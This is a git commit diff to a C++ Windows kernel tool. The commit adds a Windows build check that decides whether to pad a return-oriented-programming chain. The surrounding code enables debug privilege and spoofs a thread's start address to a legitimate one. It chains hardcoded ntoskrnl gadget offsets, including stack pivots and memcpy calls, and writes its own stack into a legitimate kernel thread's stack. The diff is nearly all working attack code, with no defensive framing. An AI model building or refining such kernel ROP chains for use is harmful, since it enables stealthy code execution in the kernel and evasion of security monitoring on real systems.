a195b539e379a14c3040b6decc4fe918531d20ce
krispy <krispybyte@proton.me>
2025-10-18 12:32:39 +0300

    Add winver check for padding gadget

--- include/utils/utils.hpp
+++ include/utils/utils.hpp
@@ -1,9 +1,11 @@
 #pragma once
 #include <vector>
+#include <string>
 
 namespace Utils
 {
 	bool EnableDebugPrivilege();
 	std::vector<std::uintptr_t> FindLegitimateKernelThreadStartAddresses();
 	std::uintptr_t FindRandomValidThreadAddress(const int MinimumDuplicates = 2);
+	std::string GetWindowsDisplayVersion();
 }
--- src/main.cpp
+++ src/main.cpp
@@ -18,6 +18,14 @@ int main()
         return EXIT_FAILURE;
     }
 
+    const std::string WindowsBuild = Utils::GetWindowsDisplayVersion();
+    if (WindowsBuild.empty())
+    {
+        std::exception("Failed to find the windows build being used");
+        return EXIT_FAILURE;
+    }
+
+    std::printf("[+] Windows build: %s\n", WindowsBuild.c_str());
     std::printf("[+] New thread address to be used @ 0x%p\n", RandomValidThreadAddress);
     std::printf("[+] ntoskrnl.exe @ 0x%p\n", Driver::GetKernelModuleBase());
 
@@ -53,37 +61,7 @@ int main()
 
     StackManager KernelStackManager(Driver::GetKernelModuleBase(), reinterpret_cast<std::uintptr_t>(StackAllocation));
 
-    // Fake the thread's start address to the random legitimate one we found
-    //KernelStackManager.ModifyThreadStartAddress(RandomValidThreadAddress);
-    //KernelStackManager.ModifyThreadStackBaseAndLimit(((uintptr_t)StackAllocation)+0x6000, (uintptr_t)StackAllocation);
-    //KernelStackManager.AddFunctionCall<int>("KeLowerIrql", 0);
-    //KernelStackManager.AddFunctionCall<NTSTATUS>("PsTerminateSystemThread", 0);
-
-    //// loop demo
-    //KernelStackManager.AddFunctionCall("KeDelayExecutionThread", 0, FALSE, (uint64_t)IntervalArgAllocation);
-    //KernelStackManager.AddFunctionCall("MmAllocateContiguousMemory", 0x6000, MAXULONG64);
-    //// we need to increment the addr by 0x2000
-    //KernelStackManager.AddGadget(0x256c4a, "pop rcx; ret;");
-    //KernelStackManager.AddValue(0x2000, "value to increment ptr by");
-    //KernelStackManager.AddGadget(0x28efa4, "add rax, rcx; ret;");
-
-    //KernelStackManager.AddGadget(0x54810e, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
-    //KernelStackManager.AddPadding(0x28);
-    //KernelStackManager.AddGadget(0x36d2de, "mov rcx, rax; cmp rax, r10; jne 0x36d2e8; ret;");
-    //KernelStackManager.AddGadget(0x3cca89, "pop rdx; ret;");
-    //KernelStackManager.AddValue((std::uint64_t)OriginalStackAllocation, "src address");
-    //KernelStackManager.AddGadget(0x2f7921, "pop r8; ret;");
-    //// NOTE: this was 0x6000 before
-    //KernelStackManager.AddValue(0x4000, "count value");
-    //KernelStackManager.AddFunctionCall("memcpy");
-
-    //KernelStackManager.AddGadget(0x36d2de, "mov rcx, rax; cmp rax, r10; jne 0x36d2e8; ret;");
-    //KernelStackManager.AddGadget(0xb4296a, "mov r11, rcx; cmp edx, dword ptr [rax]; je 0xb42978; mov eax, 0xc000000d; ret;");
-    //KernelStackManager.AddGadget(0x536d2a, "mov rsp, r11; ret;");
-
-    // pivot into thread's created stack demo
-    // Grab stack limit
-
+    // setup ropchain for our main loop
     KernelStackManager.AddFunctionCall("PsGetCurrentThread");
     KernelStackManager.AddGadget(0x24cd7b, "pop rcx; ret;");
     KernelStackManager.AddValue(0x30, "stack limit");
@@ -119,11 +97,11 @@ int main()
 
     // Write our own stack into thread's legitimate stack
 
-    // TODO: Fix this padding, this will crash sometimes if not uncommented, should be done automatically!
     // r9=rax, IMPORTANT NOTE: On some windows builds this includes "add rsp, 0x28;" and on some not,
-    // if yours includes it, then you must account for the padding, uncomment the line below.
+    // if yours includes it, then you must account for this in the check which decides if padding should be added
     KernelStackManager.AddGadget(0x2f3286, "mov r9, rax; mov rax, r9; (add rsp, 0x28; )?ret;");
-    // KernelStackManager.AddPadding(0x28);
+    if (WindowsBuild == "22H2" || WindowsBuild == "23H2")
+        KernelStackManager.AddPadding(0x28);
 
     // this gadget can either write into r8 or rdx, depending on the window version, so we will set both
     // to a valid memory dummy pool so that it writes there.
@@ -165,8 +143,8 @@ int main()
 
     // same as above r9->rax->rcx, this is being stored here so we can overwrite rax for xor operation
     KernelStackManager.AddGadget(0x2f3286, "mov r9, rax; mov rax, r9; (add rsp, 0x28; )?ret;");
-    // uncomment if your windows version has "add rsp, 0x28" in the above gadget
-    // KernelStackManager.AddPadding(0x28);
+    if (WindowsBuild == "22H2" || WindowsBuild == "23H2")
+        KernelStackManager.AddPadding(0x28);
     KernelStackManager.AddGadget(0x480032, "pop rdx; ret;");
     KernelStackManager.AddValue((uint64_t)DummyMemoryAllocation, "rdx = dummy pool allocation");
     KernelStackManager.AddGadget(0x47f82d, "pop r8; ret;");
